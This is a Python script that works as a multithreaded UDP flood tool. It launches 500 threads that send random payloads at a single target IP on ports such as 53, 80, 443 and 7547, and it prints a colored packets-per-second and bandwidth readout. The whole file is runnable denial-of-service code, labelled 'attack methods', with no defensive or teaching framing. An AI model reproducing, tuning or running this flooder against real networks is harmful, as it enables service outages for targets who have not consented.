import socket
import threading
import time
import random

TARGET_IP = "192.168.1.1"

# EFFICIENT 500 THREADS
UDP_RAPID_PPS = 125    # Fast small
UDP_PPS = 125          # Regular PPS  
UDP_RAPID_BW = 125     # Fast large
UDP_BW = 125           # Regular bandwidth
TOTAL_THREADS = 500

# Colors
YELLOW = '\033[93m'
GREEN = '\033[92m'
RED = '\033[91m'
WHITE = '\033[97m'
RESET = '\033[0m'

# Optimized socket pools
socket_pools = {}
def get_socket(thread_type):
    if thread_type not in socket_pools:
        socket_pools[thread_type] = []
        for _ in range(25):
            try:
                sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
                sock.setsockopt(socket.SOL_SOCKET, socket.SO_SNDBUF, 262144)
                socket_pools[thread_type].append(sock)
            except:
                pass
    if socket_pools[thread_type]:
        return random.choice(socket_pools[thread_type])
    return socket.socket(socket.AF_INET, socket.SOCK_DGRAM)

# Counters
total_packets = 0
total_bytes = 0

# ==================== EFFICIENT ATTACK METHODS ====================
def efficient_udp_rapid_pps(thread_id):
    global total_packets, total_bytes
    
    while True:
        sock = get_socket("rapid_pps")
        try:
            # OPTIMIZED: Batch send to same port
            payload = random.randbytes(64)
            for port in [53, 80, 443]:
                # Send 8 packets per port for efficiency
                for _ in range(8):
                    sock.sendto(payload, (TARGET_IP, port))
                    total_packets += 1
                    total_bytes += 64
        except:
            pass

def efficient_udp_pps(thread_id):
    global total_packets, total_bytes
    
    while True:
        sock = get_socket("pps")
        try:
            # OPTIMIZED: Multiple sizes, targeted ports
            sizes = [96, 128, 160]
            for _ in range(12):
                size = random.choice(sizes)
                payload = random.randbytes(size)
                port = random.choice([80, 443, 22, 21, 25, 53, 123])
                sock.sendto(payload, (TARGET_IP, port))
                total_packets += 1
                total_bytes += size
        except:
            pass

def efficient_udp_rapid_bw(thread_id):
    global total_packets, total_bytes
    
    while True:
        sock = get_socket("rapid_bw")
        try:
            # OPTIMIZED: Larger packets, fewer sends
            payload = random.randbytes(1024)
            # Hit same port multiple times (more efficient)
            for _ in range(6):
                sock.sendto(payload, (TARGET_IP, 80))
                sock.sendto(payload, (TARGET_IP, 443))
                total_packets += 2
                total_bytes += 2048
        except:
            pass

def efficient_udp_bw(thread_id):
    global total_packets, total_bytes
    
    while True:
        sock = get_socket("bw")
        try:
            # OPTIMIZED: MAX size, strategic ports
            payload = random.randbytes(1472)
            for port in [80, 443, 8080, 8443, 7547]:
                sock.sendto(payload, (TARGET_IP, port))
                total_packets += 1
                total_bytes += 1472
        except:
            pass

# ==================== LAUNCH 500 EFFICIENT THREADS ====================
for i in range(UDP_RAPID_PPS):
    t = threading.Thread(target=efficient_udp_rapid_pps, args=(i,))
    t.daemon = True
    t.start()

for i in range(UDP_PPS):
    t = threading.Thread(target=efficient_udp_pps, args=(i,))
    t.daemon = True
    t.start()

for i in range(UDP_RAPID_BW):
    t = threading.Thread(target=efficient_udp_rapid_bw, args=(i,))
    t.daemon = True
    t.start()

for i in range(UDP_BW):
    t = threading.Thread(target=efficient_udp_bw, args=(i,))
    t.daemon = True
    t.start()

# ==================== COLORED LOGGING ====================
last_log = time.time()

while True:
    time.sleep(1)
    current = time.time()
    elapsed = current - last_log
    last_log = current
    
    # Calculate
    pps = int(total_packets / elapsed) if elapsed > 0 else 0
    mbps = (total_bytes * 8) / (elapsed * 1000000) if elapsed > 0 else 0
    
    # Reset
    total_packets = 0
    total_bytes = 0
    
    # Color coding
    if mbps >= 100:
        bw_color = GREEN
    elif mbps >= 50:
        bw_color = WHITE
    else:
        bw_color = RED
    
    # Display
    print(f"{YELLOW}SK1-SSALG{RESET} | {GREEN}{pps:,}/s{RESET} | {bw_color}{mbps:.1f}Mbps{RESET}")
